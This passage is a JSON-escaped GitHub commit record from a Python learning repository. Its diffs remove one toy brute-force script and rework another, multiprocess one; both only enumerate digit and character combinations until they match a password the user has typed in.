check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n@@ -51,11 +56,14 @@ def main():\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n@@ -63,8 +71,12 @@ def main():\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n@@ -75,15 +87,14 @@ def main():\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n@@ -98,9 +109,10 @@ def main():\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","files":{"\/m14_password_crack\/brute_force_cyan.py":{"changes":[{"diff":"\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file","add":0,"remove":31,"filename":"\/m14_password_crack\/brute_force_cyan.py","badparts":["import itertools","import time","def tryPassword(passwordSet, stringTypeSet):","    start = time.time()","    chars = stringTypeSet","    attempts = 0","    for i in range(1, 9):","        for letter in itertools.product(chars, repeat=i):","            attempts += 1","            letter = ''.join(letter)","            if letter == passwordSet:","                end = time.time()","                distance = end - start","                return (attempts, distance)","while True:","    password = input(\"Password:  \")","    if not password: break","    stringType = \"1234567890\"","    tries, timeAmount = tryPassword(password, stringType)","    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"],"goodparts":[]}],"source":"\n\nimport itertools import time def tryPassword(passwordSet, stringTypeSet): start=time.time() chars=stringTypeSet attempts=0 for i in range(1, 9): for letter in itertools.product(chars, repeat=i): attempts +=1 letter=''.join(letter) if letter==passwordSet: end=time.time() distance=end -start return(attempts, distance) while True: password=input(\"Password: \") if not password: break stringType=\"1234567890\" tries, timeAmount=tryPassword(password, stringType) print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" %(password, tries, timeAmount)) ","sourceWithComments":"# Imports\nimport itertools\nimport time\n\n\n# Brute force function\ndef tryPassword(passwordSet, stringTypeSet):\n    start = time.time()\n    chars = stringTypeSet\n    attempts = 0\n    for i in range(1, 9):\n        for letter in itertools.product(chars, repeat=i):\n            attempts += 1\n            letter = ''.join(letter)\n            if letter == passwordSet:\n                end = time.time()\n                distance = end - start\n                return (attempts, distance)\n\n\nwhile True:\n\n    password = input(\"Password:  \")\n    if not password: break\n\n    # Allowed characters\n    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n    stringType = \"1234567890\"\n    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n    tries, timeAmount = tryPassword(password, stringType)\n    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"},"\/m14_password_crack\/using_brute_force.py":{"changes":[{"diff":"\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n","add":14,"remove":7,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")","parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")","import psutil","print(f\"number of cores: {psutil.cpu_count()}\")","        print(f\"oooo waiting for message\")","        print(f\"---> received message from queue: {check_info}\")"],"goodparts":["import psutil","import sys","parser = argparse.ArgumentParser(description=\"brute force password crack\")","parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")","parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")","parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")","parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")","numeric = args.numeric","alpha = args.alpha","special = args.special","        if \"exit\" in check_info:","            break"]},{"diff":"\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n","add":7,"remove":9,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})","                print(f\"~~~~ [{first_char}] terminating as requested\")","                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})","            print(f\"---! [{first_char}] password not found\")","            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})"],"goodparts":["                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})","                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})","            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})"]},{"diff":"\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n","add":5,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["    chars = \"0123456789\"","        print(f\"---> starting process number {proc_num}\")"],"goodparts":["    chars = \"\"","    if numeric: chars += \"0123456789\"","    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"","    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"","    print(f\"\\nsearch characters: {chars}\\n\")"]},{"diff":"\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n","add":6,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        password = input(\"Password:  \")","        if not password: exit()"],"goodparts":["        password = input(\"\\nPassword:  \")","        if not password:","            for _ in bf_processes:","                bf_request_queue.put({\"exit\": True})","            print(\"\\n... exiting brute force password finder\")","            break"]},{"diff":"\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n","add":2,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["            print(f\"---> putting message for char: {char} onto queue: {check_info}\")","                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"found password in {rsp_info['time']-time_start:.3f}\")"],"goodparts":["                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")"]},{"diff":"\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","add":4,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        print(f\"request: {bf_request_queue.qsize()}\")","        print(f\"response: {bf_response_queue.qsize()}\")","        print(f\"terminate: {bf_terminate_queue.qsize()}\")"],"goodparts":["        print(\"\\nQueues:\")","        print(f\"-- request: {bf_request_queue.qsize()}\")","        print(f\"-- response: {bf_response_queue.qsize()}\")","        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")"]}],"source":"\nimport itertools from time import time, sleep import argparse from multiprocessing import Process, Queue parser=argparse.ArgumentParser(description=\"Number of processes for brute force\") parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\") args=parser.parse_args() num_processes=int(args.processes) import psutil print(f\"number of cores:{psutil.cpu_count()}\") def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue): while True: print(f\"oooo waiting for message\") check_info=bf_request_queue.get() print(f\"---> received message from queue:{check_info}\") first_char=check_info[\"first_char\"] chars=check_info[\"chars\"] pw_length=check_info[\"pw_length\"] actual_password=check_info[\"actual_password\"] for next_chars in itertools.product(chars, repeat=pw_length-1): test_password=first_char +''.join(next_chars) if test_password==actual_password: bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()}) break if not bf_terminate_queue.empty(): print(f\"~~~~[{first_char}] terminating as requested\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) break else: print(f\"---![{first_char}] password not found\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) def main(): bf_request_queue=Queue() bf_response_queue=Queue() bf_terminate_queue=Queue() chars=\"0123456789\" bf_processes=list() for proc_num in range(0, num_processes): print(f\"---> starting process number{proc_num}\") proc=Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue)) proc.start() print(f\"---> process number{proc_num} started\") bf_processes.append(proc) while True: password=input(\"Password: \") if not password: exit() time_start=time() for char in chars: check_info=dict() check_info[\"first_char\"]=char check_info[\"chars\"]=chars check_info[\"pw_length\"]=len(password) check_info[\"actual_password\"]=password print(f\"---> putting message for char:{char} onto queue:{check_info}\") bf_request_queue.put(check_info) for _ in chars: rsp_info=bf_response_queue.get() if rsp_info[\"found\"]: print(f\"---> FOUND PASSWORD:{rsp_info['pw']}\") print(f\"found password in{rsp_info['time']-time_start:.3f}\") break else: print(f\"---! PASSWORD NOT FOUND:{password}\") bf_terminate_queue.put({}) sleep(1) for queue in[bf_request_queue, bf_response_queue, bf_terminate_queue]: while not queue.empty(): queue.get() print(f\"request:{bf_request_queue.qsize()}\") print(f\"response:{bf_response_queue.qsize()}\") print(f\"terminate:{bf_terminate_queue.qsize()}\") if __name__=='__main__': main() ","sourceWithComments":"import itertools\nfrom time import time, sleep\nimport argparse\nfrom multiprocessing import Process, Queue\n\nparser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\nparser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\nargs = parser.parse_args()\nnum_processes = int(args.processes)\n\nimport psutil\nprint(f\"number of cores: {psutil.cpu_count()}\")\n\n\ndef check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n\n    while True:\n\n        print(f\"oooo waiting for message\")\n        check_info = bf_request_queue.get()\n        print(f\"---> received message from queue: {check_info}\")\n\n        first_char = check_info[\"first_char\"]\n        chars = check_info[\"chars\"]\n        pw_length = check_info[\"pw_length\"]\n        actual_password = check_info[\"actual_password\"]\n\n        for next_chars in itertools.product(chars, repeat=pw_length-1):\n            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n            test_password = first_char + ''.join(next_chars)\n            if test_password == actual_password:\n                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n                break\n\n            if not bf_terminate_queue.empty():\n                print(f\"~~~~ [{first_char}] terminating as requested\")\n                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n                break\n\n        else:\n            print(f\"---! [{first_char}] password not found\")\n            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n\n        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n\n\ndef main():\n\n    bf_request_queue = Queue()\n    bf_response_queue = Queue()\n    bf_terminate_queue = Queue()\n\n    chars = \"0123456789\"\n\n    bf_processes = list()\n    for proc_num in range(0, num_processes):\n        print(f\"---> starting process number {proc_num}\")\n        proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n        proc.start()\n        print(f\"---> process number {proc_num} started\")\n        bf_processes.append(proc)\n\n    while True:\n\n        password = input(\"Password:  \")\n        if not password: exit()\n\n        time_start = time()\n        for char in chars:\n\n            check_info = dict()\n            check_info[\"first_char\"] = char\n            check_info[\"chars\"] = chars\n            check_info[\"pw_length\"] = len(password)\n            check_info[\"actual_password\"] = password\n\n            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n            bf_request_queue.put(check_info)\n\n        for _ in chars:\n            rsp_info = bf_response_queue.get()\n\n            if rsp_info[\"found\"]:\n                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n                break\n\n        else:\n            print(f\"---! PASSWORD NOT FOUND: {password}\")\n\n        # put a single terminate message in the queue so all process see it and quit\n        bf_terminate_queue.put({})\n        sleep(1)\n\n        # clear out any excess messages in all the queues\n        for queue in [bf_request_queue, bf_response_queue, bf_terminate_queue]:\n            while not queue.empty():\n                queue.get()\n\n        print(f\"request: {bf_request_queue.qsize()}\")\n        print(f\"response: {bf_response_queue.qsize()}\")\n        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"remove cyan, improve brute_force"}},"https:\/\/github.com\/Ihsan06\/52_weeks_python":{"98284397b4bb5c04c3ff2cd85e247edd8dba6d64":{"url":"https:\/\/api.github.com\/repos\/Ihsan06\/52_weeks_python\/commits\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","html_url":"https:\/\/github.com\/Ihsan06\/52_weeks_python\/commit\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","message":"remove cyan, improve brute_force","sha":"98284397b4bb5c04c3ff2cd85e247edd8dba6d64","keyword":"brute force improve","diff":"diff --git a\/m14_password_crack\/brute_force_cyan.py b\/m14_password_crack\/brute_force_cyan.py\ndeleted file mode 100644\nindex b2bdbea5..00000000\n--- a\/m14_password_crack\/brute_force_cyan.py\n+++ \/dev\/null\n@@ -1,31 +0,0 @@\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file\ndiff --git a\/m14_password_crack\/using_brute_force.py b\/m14_password_crack\/using_brute_force.py\nindex 42c46782..a938de40 100644\n--- a\/m14_password_crack\/using_brute_force.py\n+++ b\/m14_password_crack\/using_brute_force.py\n@@ -2,23 +2,30 @@\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n@@ -26,23 +33,21 @@ def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n@@ -51,11 +56,14 @@ def main():\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n@@ -63,8 +71,12 @@ def main():\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n@@ -75,15 +87,14 @@ def main():\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n@@ -98,9 +109,10 @@ def main():\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","files":{"\/m14_password_crack\/brute_force_cyan.py":{"changes":[{"diff":"\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file","add":0,"remove":31,"filename":"\/m14_password_crack\/brute_force_cyan.py","badparts":["import itertools","import time","def tryPassword(passwordSet, stringTypeSet):","    start = time.time()","    chars = stringTypeSet","    attempts = 0","    for i in range(1, 9):","        for letter in itertools.product(chars, repeat=i):","            attempts += 1","            letter = ''.join(letter)","            if letter == passwordSet:","                end = time.time()","                distance = end - start","                return (attempts, distance)","while True:","    password = input(\"Password:  \")","    if not password: break","    stringType = \"1234567890\"","    tries, timeAmount = tryPassword(password, stringType)","    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"],"goodparts":[]}],"source":"\n\nimport itertools import time def tryPassword(passwordSet, stringTypeSet): start=time.time() chars=stringTypeSet attempts=0 for i in range(1, 9): for letter in itertools.product(chars, repeat=i): attempts +=1 letter=''.join(letter) if letter==passwordSet: end=time.time() distance=end -start return(attempts, distance) while True: password=input(\"Password: \") if not password: break stringType=\"1234567890\" tries, timeAmount=tryPassword(password, stringType) print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" %(password, tries, timeAmount)) ","sourceWithComments":"# Imports\nimport itertools\nimport time\n\n\n# Brute force function\ndef tryPassword(passwordSet, stringTypeSet):\n    start = time.time()\n    chars = stringTypeSet\n    attempts = 0\n    for i in range(1, 9):\n        for letter in itertools.product(chars, repeat=i):\n            attempts += 1\n            letter = ''.join(letter)\n            if letter == passwordSet:\n                end = time.time()\n                distance = end - start\n                return (attempts, distance)\n\n\nwhile True:\n\n    password = input(\"Password:  \")\n    if not password: break\n\n    # Allowed characters\n    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n    stringType = \"1234567890\"\n    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n    tries, timeAmount = tryPassword(password, stringType)\n    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"},"\/m14_password_crack\/using_brute_force.py":{"changes":[{"diff":"\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", 